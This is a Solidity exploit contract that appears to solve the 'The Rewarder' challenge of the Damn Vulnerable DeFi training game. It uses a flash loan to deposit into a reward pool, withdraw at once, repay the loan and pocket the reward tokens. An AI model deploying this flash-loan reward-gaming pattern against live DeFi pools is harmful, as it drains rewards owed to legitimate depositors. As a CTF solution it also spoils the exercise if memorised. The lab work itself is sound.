interface IFlashLoanerPool  {

    function flashLoan(uint256 amount) external;
}

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

contract therewarderExp  {

    TheRewarderPool rewardpool;
    FlashLoanerPool flashpool;
    DamnValuableToken dtoken;
    RewardToken rtoken;

    constructor(address _flashpool, address _rewardpool, address _dtoken,address _rtoken) {
        rewardpool = TheRewarderPool(_rewardpool);
        flashpool = FlashLoanerPool(_flashpool);
        dtoken = DamnValuableToken(_dtoken);
        rtoken = RewardToken(_rtoken);
    }

    function initFlashloan(uint amount) external {
        flashpool.flashLoan(amount);

    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashpool), "not flash pool");
        dtoken.approve(address(rewardpool), amount);
        rewardpool.deposit(amount);        
        rewardpool.withdraw(amount);
        dtoken.transfer(address(flashpool), amount);

    }

    function withdrawToken() external {
        rtoken.transfer(msg.sender, rtoken.balanceOf(address(this)));
    }
}